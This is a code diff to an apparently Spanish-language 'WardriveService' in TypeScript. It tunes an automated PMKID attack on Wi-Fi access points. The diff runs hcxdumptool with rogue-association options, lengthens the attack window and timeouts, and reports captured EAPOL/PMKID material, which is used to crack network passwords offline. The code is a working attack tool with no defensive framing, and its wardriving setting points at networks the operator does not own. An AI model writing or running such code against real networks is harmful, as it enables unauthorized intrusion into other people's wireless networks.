@@ -1305,20 +1305,22 @@ export class WardriveService extends EventEmitter {
     }
 
     this.progress(bssid, "scan", `Ataque PMKID → ${ssid || bssid} (canal ${channel})...`,
-      `hcxdumptool -i ${this.iface} -c ${channel}a --bpf ${bpfFile} --exitoneapol 3`);
+      `hcxdumptool -i ${this.iface} -c ${channel}a --bpf ${bpfFile} --attemptapmax 500 --exitoneapol 3`);
 
-    // The attack window: 60s of directed PMKID requests. The runner writes
-    // a full-channel dumpcap in parallel (rt2800usb loses hcx -w frames);
-    // hcxdumptool exits on the first EAPOL (bitmask 3 = PMKID/M2M3).
-    const runner = new PmkidDriveRunner(this.iface, bssid, pcapngPath, channel || 1, 60_000, bpfFile);
+    // The attack window: 90s of ACTIVE PMKID requests (rogue association —
+    // hcxdumptool associates itself as a client and asks the AP directly,
+    // the standard clientless flow). The runner writes a full-channel
+    // dumpcap in parallel (rt2800usb loses hcx -w frames); hcxdumptool
+    // exits on the first EAPOL (bitmask 3 = PMKID/M2M3).
+    const runner = new PmkidDriveRunner(this.iface, bssid, pcapngPath, channel || 1, 90_000, bpfFile);
     this.captureRunner = null; // (a different class — this slot stays free)
     this.pmkidAttackRunner = runner;
-    runner.on("hit", () => {
-      this.progress(bssid, "validate", "¡PMKID recibido! Cerrando captura...");
+    runner.on("hit", ({ line }: { line: string }) => {
+      this.progress(bssid, "validate", `¡Material recibido! (${line}) Cerrando captura...`);
     });
     const exited = new Promise<void>((resolve) => runner.on("exit", () => resolve()));
     runner.start();
-    await Promise.race([exited, sleep(68_000)]);
+    await Promise.race([exited, sleep(92_000)]);
     runner.stop();
     this.pmkidAttackRunner = null;
     if (this.attackAbort) {
